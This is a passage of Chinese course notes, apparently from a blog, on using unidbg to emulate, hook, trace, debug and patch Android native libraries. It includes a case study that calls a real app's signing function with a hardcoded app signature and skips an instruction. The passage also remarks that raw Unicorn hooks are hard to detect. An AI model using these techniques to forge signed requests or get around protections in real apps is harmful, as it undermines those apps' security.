&quot;</span>+str);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        hookZz.disable_arm_arm64_b_branch();  <span class="comment">//可有可无</span></span><br><span class="line"><span class="comment">//调用jstc2Cstr</span></span><br><span class="line">        Number number=<span class="keyword">module</span>.callFunction(emulator,<span class="string">&quot;_Z12jstring2cstrP7_JNIEnvP8_jstring&quot;</span>,vm.getJNIEnv(),vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm,<span class="string">&quot;zxk1ng&quot;</span>)));</span><br><span class="line">        Long cstraddr=number.longValue();<span class="comment">//观察这个jstring2cstr 返回值是一个指针，内容是地址 64位用long</span></span><br><span class="line">    <span class="comment">//因为是地址，所以读内存取参数</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = emulator.getMemory().pointer(cstraddr).getByteArray(<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        Inspector.inspect(bytes,<span class="string">&quot;cstraddr&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行Hookzz的时候把相应的&quot;RegisterContext&quot;改为“HookZzArm64RegisterContext”</p><p>这时可以修改寄存器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IHookZz</span> <span class="variable">hookZz</span> <span class="operator">=</span> HookZz.getInstance(emulator); <span class="comment">// 加载HookZz，支持inline hook，文档看https://github.com/jmpews/HookZz</span></span><br><span class="line">       hookZz.enable_arm_arm64_b_branch(); <span class="comment">// 测试enable_arm_arm64_b_branch，可有可无</span></span><br><span class="line">       hookZz.wrap(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;_Z12jstring2cstrP7_JNIEnvP8_jstring&quot;</span>), <span class="keyword">new</span> <span class="title class_">WrapCallback</span>&lt;HookZzArm64RegisterContext&gt;() &#123; <span class="comment">// inline wrap导出函数</span></span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookZzArm64RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">intArg</span> <span class="operator">=</span> ctx.getIntArg(<span class="number">1</span>); </span><br><span class="line">                <span class="type">StringObject</span> <span class="variable">str</span> <span class="operator">=</span> vm.getObject(intArg); <span class="comment">//对象是String</span></span><br><span class="line">                System.out.println(<span class="string">&quot;precall str = &quot;</span>+str.getValue());</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookZzArm64RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">               <span class="comment">//修改返回值</span></span><br><span class="line">               <span class="type">int</span> hashcode= vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm,<span class="string">&quot;zxk1ng~&quot;</span>));</span><br><span class="line">               ctx.setXLong(<span class="number">0</span>,hashcode);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       hookZz.disable_arm_arm64_b_branch();  <span class="comment">//可有可无</span></span><br><span class="line">       Number number=<span class="keyword">module</span>.callFunction(emulator,<span class="string">&quot;_Z12jstring2cstrP7_JNIEnvP8_jstring&quot;</span>,vm.getJNIEnv(),vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm,<span class="string">&quot;zxk1ng&quot;</span>)));</span><br><span class="line">       <span class="type">int</span> <span class="variable">hashcode</span> <span class="operator">=</span> number.intValue();</span><br><span class="line">       StringObject strResult=vm.getObject(hashcode);</span><br><span class="line">       System.out.println(strResult.getValue());</span><br></pre></td></tr></table></figure><h3 id="hookzz-replace">hookzz replace</h3><p>HOOK替换(hookzz.replace)</p><ul><li>new ReplaceCallback</li><li>替换以后依然可以调用原函数</li><li>不调用原函数的返回设置 return <a href="http://HookStatus.LR">HookStatus.LR</a>(emulator,value);</li></ul><p>xjb第30课时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">IHookZz</span> <span class="variable">hookZz</span> <span class="operator">=</span> HookZz.getInstance(emulator);</span><br><span class="line">            hookZz.replace(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;Java_com_xiaojianbang_ndk_NativeHelper_md5&quot;</span>), <span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123;  <span class="comment">//context获得参数啥的</span></span><br><span class="line">                <span class="comment">//修改返回值为100，注意对此函数调用也进行一定修改</span></span><br><span class="line">                <span class="keyword">return</span> HookStatus.LR(emulator,<span class="number">100</span>);</span><br><span class="line">                <span class="comment">//return super.onCall(emulator,context,originFunction); 返回调用原函数</span></span><br><span class="line">                <span class="comment">//return HookStatus.RET(emulator,originFunction);   返回调用原函数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">int</span> <span class="variable">md5Result</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodInt(emulator, <span class="string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;xiaojianbang&quot;</span>)); <span class="comment">// 执行Jni方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;md5Result: &quot;</span> + md5Result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>调用原函数</li></ul><p>return super.onCall(emulator, context, originFunction) 《==》return HookStatus(emulator, originFunction);</p><h3 id="Dobby">Dobby</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Dobby</span> <span class="variable">dobby</span> <span class="operator">=</span>Dobby.getInstance(emulator); </span><br><span class="line">dobby.replace(address, <span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123; </span><br><span class="line">                <span class="comment">//如不想执行源程序逻辑，可直接返回到LR寄存器中的地址</span></span><br><span class="line">                HookStatus.RET(emulator,context.getLR());</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.onCall(emulator,context,originFunction); 返回调用原函数</span><br><span class="line">                <span class="comment">//return HookStatus.RET(emulator,originFunction);   返回调用原函数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="xhook">xhook</h3><p>xhook框架只能实现符号表的hook，优点是稳定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IxHook ixHook=XHookImpl.getInstance(emulator);</span><br><span class="line">ixHook.register(soName,符号名，<span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>()&#123;</span><br><span class="line">    <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.onCall(emulator,context,originFunction); 返回调用原函数</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">&#125;)</span><br><span class="line">ixHook.refresh();</span><br></pre></td></tr></table></figure><p>需要注意的是传入的函数名称是原始名称，而不是经过ida解释后的名称在使用register方法进行了hook之后，需要使用refresh()方法刷新后，hook才生效</p><h3 id="原生UnicornHook">原生UnicornHook</h3><p>xjb第31课时</p><ul><li>基于原生Unicorn API进行hook时，<strong>不需要考虑地址是否 +1</strong></li><li>原生unicorn的HOOK功能强大 <strong>不容易被检测</strong></li><li>emulator.getBanked().reg_write(ArmConst.UC_ARM_REG_PC,value) 修改寄存器值 如果是Thumb 要加1</li></ul><p>下面这个Hook框架：当执行到特定汇编指令时会回调入框架的hook方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">emulator.getBackend().hook_add_new(<span class="keyword">new</span> <span class="title class_">CodeHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hook</span><span class="params">(Backend backend, <span class="type">long</span> address, <span class="type">int</span> size, Object user)</span> &#123;</span><br><span class="line">                RegisterContext context=emulator.getContext();</span><br><span class="line">                <span class="keyword">if</span>(address== <span class="keyword">module</span>.base+<span class="number">0x1FF4</span>)&#123;</span><br><span class="line">                    Pointer md5_ctx=context.getPointerArg(<span class="number">0</span>);</span><br><span class="line">                    Inspector.inspect(md5_ctx.getByteArray(<span class="number">0</span>,<span class="number">32</span>),<span class="string">&quot;md5_ctx&quot;</span>);</span><br><span class="line">                    Pointer plainText=context.getPointerArg(<span class="number">1</span>);</span><br><span class="line">                    <span class="type">int</span> length=context.getIntArg(<span class="number">2</span>);</span><br><span class="line">                    Inspector.inspect(plainText.getByteArray(<span class="number">0</span>,length),<span class="string">&quot;plainText&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(address== <span class="keyword">module</span>.base+<span class="number">0x2004</span>)&#123;</span><br><span class="line">                    Pointer cipherText=context.getPointerArg(<span class="number">1</span>);</span><br><span class="line">                    Inspector.inspect(cipherText.getByteArray(<span class="number">0</span>,<span class="number">16</span>),<span class="string">&quot;cipherText&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAttach</span><span class="params">(UnHook unHook)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">detach</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="keyword">module</span>.base+<span class="number">0x1FE8</span>, <span class="keyword">module</span>.base+<span class="number">0x2004</span>,<span class="literal">null</span> );  <span class="comment">//md5函数中汇编指令</span></span><br><span class="line">        <span class="type">StringObject</span> <span class="variable">md5Result</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodObject(emulator, <span class="string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;xiaojianbang&quot;</span>)); <span class="comment">// 执行Jni方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;md5Result: &quot;</span> + md5Result.getValue());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="打印调用栈">打印调用栈</h3><p>xjb32课时</p><p><code>emulator.getUnwinder().unwind();</code></p><h3 id="unidbg中的动态调式">unidbg中的动态调式</h3><ul><li><p>基于unicorn的console debuger 同样不需要管地址 +1</p></li><li><p>附加下断点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Debugger</span> <span class="variable">debugger</span> <span class="operator">=</span> emulator.attach();</span><br><span class="line">debugger.addBreakPoint(<span class="keyword">module</span>.base+<span class="number">0x1AF4</span>);</span><br><span class="line">debugger.addBreakPoint(<span class="keyword">module</span>.base+<span class="number">0x1AF8</span>);</span><br></pre></td></tr></table></figure></li><li><p>b：下端点 b0x地址</p></li><li><p>m：读内存 mx0</p></li><li><p>bt：查看函数栈</p></li><li><p>w：写寄存器</p></li></ul><h3 id="监控内存读写">监控内存读写</h3><p>xjb第34课时</p><ul><li>将信息输出到文件</li></ul><p><code>String traceFile=&quot;yourpath&quot;;</code><br><code>PrintStream traceStream = new PrintStream(new FileOutputStream(traceFile),true);</code></p><ul><li>监控内存读</li></ul><p><code>emulator.traceRead(module.base, module.base+ module.size).setRedirect(traceStream);</code></p><p>setRedirect(traceStream) 重定向到traceStream</p><ul><li>监控内存写</li></ul><p><code>emulator.traceWrite(module.base, module.base+ module.size).setRedirect(traceStream);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String traceFile=<span class="string">&quot;yourpath&quot;</span>;   <span class="comment">//写入yourpath文件</span></span><br><span class="line">       <span class="type">PrintStream</span> <span class="variable">traceStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           traceStream = <span class="keyword">new</span> <span class="title class_">PrintStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(traceFile),<span class="literal">true</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">       &#125;</span><br><span class="line">       emulator.traceRead(<span class="keyword">module</span>.base, <span class="keyword">module</span>.base+ <span class="keyword">module</span>.size).setRedirect(traceStream);</span><br><span class="line">       emulator.traceWrite(<span class="keyword">module</span>.base, <span class="keyword">module</span>.base+ <span class="keyword">module</span>.size).setRedirect(traceStream);</span><br><span class="line">       <span class="type">StringObject</span> <span class="variable">md5Result</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodObject(emulator, <span class="string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;xiaojianbang&quot;</span>)); <span class="comment">// 执行Jni方法</span></span><br><span class="line">       System.out.println(<span class="string">&quot;md5Result: &quot;</span> + md5Result.getValue());</span><br></pre></td></tr></table></figure><h3 id="unidbg-trace">unidbg trace</h3><p>记录代码真正执行的指令和寄存器的状态</p><p>代码写法（基本）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> String traceFile=<span class="string">&quot;yourpath&quot;</span>;</span><br><span class="line">        <span class="type">PrintStream</span> <span class="variable">traceStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintStream</span>(<span class="keyword">new</span>        <span class="title class_">FileOutputStream</span>(traceFile),<span class="literal">true</span>);</span><br><span class="line">        emulator.traceCode(<span class="keyword">module</span>.base, <span class="keyword">module</span>.base+ <span class="keyword">module</span>.size).setRedirect(traceStream);</span><br><span class="line"></span><br><span class="line"><span class="comment">//setRedirect(traceStream); 重定向</span></span><br></pre></td></tr></table></figure><h3 id="unidbg-patch">unidbg patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UnidbgPointer</span> <span class="variable">pointer</span> <span class="operator">=</span>UnidbgPointer.pointer(emulator,目标地址);</span><br><span class="line"><span class="type">byte</span>[] code=<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x1</span>,<span class="number">0x2</span>&#125;;</span><br><span class="line">pointer.write(code);</span><br></pre></td></tr></table></figure><p>使用脚本自动把汇编代码变为机器码，然后patch</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UnidbgPointer</span> <span class="variable">pointer</span> <span class="operator">=</span>UnidbgPointer.pointer(emulator,目标地址);</span><br><span class="line"><span class="type">Keystone</span> <span class="variable">keystone</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Keystone</span>(KeystoneArchitecture.Arm,KeystoneMode.ArmThumb);</span><br><span class="line">String s=<span class="string">&quot;subs r0,r2,r3&quot;</span>;</span><br><span class="line"><span class="type">byte</span>[] code=keystone.assemble(s).getMachineCode();</span><br><span class="line">pointer.write(code);</span><br></pre></td></tr></table></figure><h3 id="处理so调用自写的Java类1">处理so调用自写的Java类1</h3><p>xjb37课时</p><ul><li>将自写的java类 放到unidbg工程中</li><li>包名最好与原包名一致</li><li>类中有用到android相关类 需要用Java实现</li><li>代码不需要完全一致 只需函数处理结果符合预期即可</li><li>访问修饰符的问题<br>1.JNI调用Java函数不需要理会访问修饰符<br>2.unidbg用Java开发 在调用函数时需要注意访问修饰符<br>3.解决方法可以用反射 或者直接将private改为public</li></ul><h3 id="Unidbg案例">Unidbg案例</h3><p>xjb第41课时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//方法一</span></span><br><span class="line"><span class="comment">//        emulator.getBackend().hook_add_new(new CodeHook() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void hook(Backend backend, long address, int size, Object user) &#123;</span></span><br><span class="line"><span class="comment">//                //当执行到0xABE执行这个回调函数：修改PC寄存器使他跳过 4+1(Thumb)字节码 执行下一个汇编代码</span></span><br><span class="line"><span class="comment">//                emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_PC,address+4+1);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void onAttach(UnHook unHook) &#123;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void detach() &#123;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;,module.base+0xABE,module.base+0xABE,null);</span></span><br><span class="line">        <span class="comment">//方法二 断点</span></span><br><span class="line">     </span><br><span class="line">        emulator.attach().addBreakPoint(<span class="keyword">module</span>.base + <span class="number">0xABE</span>, <span class="keyword">new</span> <span class="title class_">BreakPointCallback</span>() &#123;</span><br><span class="line">            <span class="comment">//获取r1寄存器指针</span></span><br><span class="line">           <span class="comment">// UnidbgPointer                 pointer=UnidbgPointer.register(emulator,ArmConst.UC_ARM_REG_R1) ==》pointer.getString(0)</span></span><br><span class="line">            </span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onHit</span><span class="params">(Emulator&lt;?&gt; emulator, <span class="type">long</span> address)</span> &#123;</span><br><span class="line">                emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_PC,address+<span class="number">4</span>+<span class="number">1</span>);</span><br><span class="line">                <span class="comment">//false：在断点处停下 true：不会停在断点处</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">     </span><br><span class="line">        String data=<span class="string">&quot;1636221462621&quot;</span>;</span><br><span class="line">        <span class="type">StringObject</span> <span class="variable">strResult</span> <span class="operator">=</span> SignManager.callStaticJniMethodObject(emulator, <span class="string">&quot;getSign(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;&quot;</span>), <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;&quot;</span>), <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, data)); <span class="comment">// 执行Jni方法</span></span><br><span class="line">        System.out.println(strResult);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//补环境</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> DvmObject&lt;?&gt; callStaticObjectMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;com/sichuanol/cbgc/util/LogShutDown-&gt;getAppSign()Ljava/lang/String;&quot;</span>.equals(signature))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;0093CB6721DAF15D31CFBC9BBE3A2B79&quot;</span>);  <span class="comment">//包装返回值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.callStaticObjectMethodV(vm, dvmClass, signature, vaList);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="unidbg中的VirtualModule">unidbg中的VirtualModule</h3><p>xjb第45课时</p><ul><li>unidbg的虚拟模块功能，可以用来注册虚拟的so，自己实现so中相应的方法</li><li>libandroid.so用于读取app的assests资源</li><li><a href="http://xn--solibandroid-694s64nq38bkf1cwowh18ik0gw97c.so">如果so中需要依赖该libandroid.so</a> 可以注册libandroid.so到内存中<br><code>new AndroidModule(emulator,vm).register(memory);</code></li><li>在unidbg源码的java-&gt;virtualmodule.android-&gt;AndroidMoudle，把他放在相应的.java同包下在进行修改。</li></ul><p>以xjb课程的NativeHelper为例 <a href="http://xn--xiaojianbangA-hu1u681cs17a4d0lec2b.so">加载自定义xiaojianbangA.so</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XiaojianbangAModule</span> <span class="keyword">extends</span> <span class="title class_">VirtualModule</span>&lt;VM&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">XiaojianbangAModule</span><span class="params">(Emulator&lt;?&gt; emulator, VM vm)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(emulator, vm, <span class="string">&quot;libxiaojianbangA.so&quot;</span>); <span class="comment">//要模拟的so</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onInitialize</span><span class="params">(Emulator&lt;?&gt; emulator, <span class="keyword">final</span> VM vm, Map&lt;String, UnidbgPointer&gt; symbols)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">is64Bit</span> <span class="operator">=</span> emulator.is64Bit();</span><br><span class="line">        <span class="type">SvcMemory</span> <span class="variable">svcMemory</span> <span class="operator">=</span> emulator.getSvcMemory();</span><br><span class="line">        symbols.put(<span class="string">&quot;_Z7bssFuncv&quot;</span>, svcMemory.registerSvc(is64Bit ? <span class="keyword">new</span> <span class="title class_">Arm64Svc</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">handle</span><span class="params">(Emulator&lt;?&gt; emulator)</span> &#123;</span><br><span class="line">                fromJava(emulator, vm);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; : <span class="keyword">new</span> <span class="title class_">ArmSvc</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">handle</span><span class="params">(Emulator&lt;?&gt; emulator)</span> &#123;</span><br><span class="line">                fromJava(emulator, vm);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//加载的内容</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fromJava</span><span class="params">(Emulator&lt;?&gt; emulator, VM vm)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;libxiaojianbangA.so&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主要java代码中 添加</span></span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">XiaojianbangAModule</span>(emulator, vm).register(memory);</span><br><span class="line"><span class="type">DalvikModule</span> <span class="variable">dm</span> <span class="operator">=</span> vm.loadLibrary(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;unidbg-android/src/test/java/com/xiaojianbang/ndk/libxiaojianbang.so&quot;</span>), <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h3 id="unidbg进行爆破求flag">unidbg进行爆破求flag</h3><p>native为(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</p><p>通过爆破与已知字符串相比较求flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span 